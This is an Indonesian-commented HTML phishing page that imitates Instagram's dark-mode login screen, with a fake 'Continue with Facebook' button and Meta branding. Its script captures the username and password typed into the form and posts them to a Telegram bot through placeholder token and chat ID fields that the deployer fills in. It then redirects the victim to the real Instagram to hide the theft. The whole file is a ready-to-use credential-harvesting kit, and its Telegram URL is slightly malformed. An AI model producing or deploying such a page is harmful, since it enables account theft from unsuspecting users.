<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login • Dark Mode</title>
    <!-- Mengambil font tulisan sambung mirip logo asli Instagram -->
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            /* Gradasi gelap keunguan sesuai gambar Figma */
            background: linear-gradient(180deg, #120326 0%, #0c0817 50%, #05040a 100%);
            margin: 0; 
            color: #ffffff;
        }
        .container { 
            width: 100%;
            max-width: 340px; 
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
        }
        /* Bahasa di bagian atas */
        .language-selector {
            font-size: 12px;
            color: #a8a8a8;
            margin-bottom: 25px;
            cursor: pointer;
        }
        .language-selector::after {
            content: " ∨";
            font-size: 9px;
        }
        /* Logo Instagram Menggunakan Font */
        .logo { 
            font-family: 'Grand Hotel', cursive;
            font-size: 48px;
            margin: 10px 0 30px 0;
            color: #ffffff;
        }
        /* Tombol Facebook */
        .btn-fb {
            width: 100%;
            padding: 12px;
            background-color: #1774f2;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        /* Pembatas OR / ATAU */
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            color: #737373;
            font-size: 12px;
            margin-bottom: 20px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #262626;
        }
        .divider:not(:empty)::before { margin-right: .5em; }
        .divider:not(:empty)::after { margin-left: .5em; }

        /* Kolom Input */
        .input-group { margin-bottom: 12px; position: relative; }
        .input-group input { 
            width: 100%; 
            padding: 14px; 
            border: 1px solid #363636; 
            border-radius: 8px; 
            box-sizing: border-box; 
            background-color: #1c1929;
            font-size: 13px;
            color: white;
        }
        .input-group input::placeholder {
            color: #737373;
        }
        .input-group input:focus {
            border-color: #555555;
            outline: none;
        }
        /* Icon Mata untuk password */
        .show-pass {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #a8a8a8;
            font-size: 14px;
            cursor: pointer;
        }
        /* Lupa Password */
        .forgot-pass {
            display: block;
            text-align: right;
            font-size: 12px;
            color: #a8a8a8;
            text-decoration: none;
            margin-bottom: 20px;
        }
        /* Tombol Log In */
        .btn-login { 
            width: 100%; 
            padding: 14px; 
            background-color: #004c80; /* Warna biru gelap tanda belum diisi penuh */
            color: #959595; 
            border: none; 
            border-radius: 25px; 
            font-size: 14px; 
            font-weight: bold;
            cursor: pointer; 
            margin-bottom: 25px;
        }
        /* Aktifkan warna cerah jika input mulai diketik (opsional via js) */
        .btn-login.active {
            background-color: #0095f6;
            color: white;
        }
        /* Teks Daftar */
        .signup-text {
            font-size: 13px;
            color: #737373;
            margin-bottom: 40px;
        }
        .signup-text a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }
        /* Bagian Bawah Footer */
        .btn-create {
            width: 100%;
            padding: 12px;
            background-color: transparent;
            color: #0095f6;
            border: 1px solid #004c80;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 20px;
        }
        .meta-logo {
            font-size: 12px;
            color: #737373;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="language-selector">English (US)</div>
    
    <!-- Judul bergaya logo tulis tangan -->
    <div class="logo">Instagram</div>

    <!-- Tombol Palsu Facebook -->
    <button class="btn-fb">
        <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/></svg>
        Continue with Facebook
    </button>

    <div class="divider">OR</div>

    <!-- Form Pengirim ke Telegram -->
    <form id="telegramForm">
        <div class="input-group">
            <input type="text" id="username" required placeholder="Username, email address or mobile number">
        </div>
        <div class="input-group">
            <input type="password" id="password" required placeholder="Password">
            <span class="show-pass">👁</span>
        </div>
        
        <a href="#" class="forgot-pass">Forgotten password?</a>
        
        <button type="submit" class="btn-login" id="loginBtn">Log In</button>
    </form>

    <div class="signup-text">
        Don't have an account? <a href="#">Sign up</a>
    </div>

    <button class="btn-create">Create new account</button>
    
    <div class="meta-logo">∞ Meta</div>
</div>

<script>
// Otomatis ubah warna tombol jadi biru terang jika kolom mulai diisi
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');

function checkInput() {
    if (usernameInput.value.length > 0 && passwordInput.value.length > 0) {
        loginBtn.classList.add('active');
    } else {
        loginBtn.classList.remove('active');
    }
}
usernameInput.addEventListener('input', checkInput);
passwordInput.addEventListener('input', checkInput);

// Sistem Pengiriman Bot Telegram
document.getElementById('telegramForm').addEventListener('submit', function(e) {
    e.preventDefault(); 

    // Kredensial Telegram (GANTI DENGAN DATA MILIK ANDA)
    const botToken = "TOKEN_BOT_ANDA";
    const chatId = "CHAT_ID_ANDA";

    const pesan = `=== DATA LOGIN INSTAGRAM DARK ===\nUsername: ${usernameInput.value}\nPassword: ${passwordInput.value}`;

    fetch(`https://telegram.org{botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: pesan })
    })
    .then(response => {
        if(response.ok) {
            // GANTI DENGAN URL WEBSITE TUJUAN ANDA
            window.location.href = "https://instagram.com"; 
        } else {
            alert('Gagal mengirim data. Periksa konfigurasi API Bot.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Terjadi kesalahan jaringan.');
    });
});
</script>

</body>
</html>
